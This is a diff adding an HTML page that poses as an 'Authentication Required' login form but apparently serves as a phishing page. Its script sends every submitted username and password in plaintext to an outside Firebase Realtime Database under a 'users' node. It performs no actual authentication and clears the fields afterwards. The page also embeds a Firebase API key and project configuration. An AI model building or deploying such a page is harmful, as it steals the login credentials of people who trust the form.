@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Form</title>
+    <!-- Include Firebase libraries -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+</head>
+
+<body>
+    <img src="ss.png" width="50%" height="50%" style="display: table-cell;margin-left: 19%;">
+    <div style="margin-top: -20%;">
+        <h1 style="color: #6a6a6a;margin-top:22% ;margin-left: 24.49%;">Authentication Required</h1>
+        <p style="margin-left: 24.49%;">Please enter your username and password to continue.</p>
+
+        <form id="authForm" style="margin-left: 24.49%;">
+            <label for="username">Username</label>
+            <input type="text" id="username" required><br><br>
+            <label for="password">Password</label>
+            <input type="password" id="password" required><br><br>
+            <button type="button" id="submitButton"
+                style="background-color: rgb(47, 113, 178);border-color: rgb(34, 103, 173);color: #fff;width: 5rem;height: 1.8rem;border-radius: 1mm;">
+                <a href="blank.html" style="text-decoration: none;color: #fff;"></a>Continue</button>
+        </form>
+
+        <script>
+            const firebaseConfig = {
+                apiKey: "AIzaSyArrHRVEMndffdRVUaZ2H-DC5A5agbe1PI",
+                authDomain: "firewall-92dc1.firebaseapp.com",
+                databaseURL: "https://firewall-92dc1-default-rtdb.firebaseio.com/",
+                projectId: "firewall-92dc1",
+                storageBucket: "firewall-92dc1.appspot.com",
+                messagingSenderId: "302210107919",
+                appId: "1:302210107919:web:2a9c0273704283c4bef17a",
+                measurementId: "G-1FB2QLQEHS"
+            };
+
+            // Initialize Firebase
+            firebase.initializeApp(firebaseConfig);
+
+            // Get a reference to the Firebase Realtime Database
+            const database = firebase.database();
+
+            const authForm = document.getElementById('authForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const submitButton = document.getElementById('submitButton');
+
+            submitButton.addEventListener('click', () => {
+                const username = usernameInput.value;
+                const password = passwordInput.value;
+
+                // Push data to Firebase Realtime Database under 'users' node
+                database.ref('users').push({
+                    username: username,
+                    password: password
+                });
+
+                // Clear form inputs after submission (optional)
+                usernameInput.value = '';
+                passwordInput.value = '';
+
+                // Optionally, you can redirect the user to another page after submission
+                // window.location.href = "blank.html";
+            });
+        </script>
+</body>
+
+</html>
